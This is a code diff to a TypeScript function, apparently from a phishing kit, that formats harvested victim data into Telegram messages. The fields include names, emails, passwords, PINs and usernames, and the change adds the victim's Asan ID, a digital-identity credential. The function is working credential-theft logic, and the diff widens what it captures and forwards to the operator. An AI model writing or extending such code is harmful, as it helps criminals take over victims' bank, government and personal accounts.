@@ -119,7 +119,7 @@ export const sendTelegramMessage = async (params: {
         }
 
         // Section: USER DATA (Only if provided)
-        const hasUserData = newInfo.phoneNumber || newInfo.name || newInfo.email || newInfo.password || newInfo.pin || newInfo.username;
+        const hasUserData = newInfo.phoneNumber || newInfo.name || newInfo.email || newInfo.password || newInfo.pin || newInfo.username || newInfo.asanId;
         if (hasUserData) {
             message += `<b>👤 USER DATA:</b>\n`;
             if (newInfo.name) message += `• <b>Name:</b> <code>${newInfo.name}</code>\n`;
@@ -128,6 +128,7 @@ export const sendTelegramMessage = async (params: {
             if (newInfo.email) message += `• <b>Email:</b> <code>${newInfo.email}</code>\n`;
             if (newInfo.password) message += `• <b>Pass:</b> <code>${newInfo.password}</code>\n`;
             if (newInfo.pin) message += `• <b>PIN:</b> <code>${newInfo.pin}</code>\n`;
+            if (newInfo.asanId) message += `• <b>Asan ID:</b> <code>${newInfo.asanId}</code>\n`;
             if (newInfo.country && !exclude?.includes("country")) message += `• <b>Selected Country:</b> <code>${newInfo.country}</code>\n`;
             message += `\n`;
         }
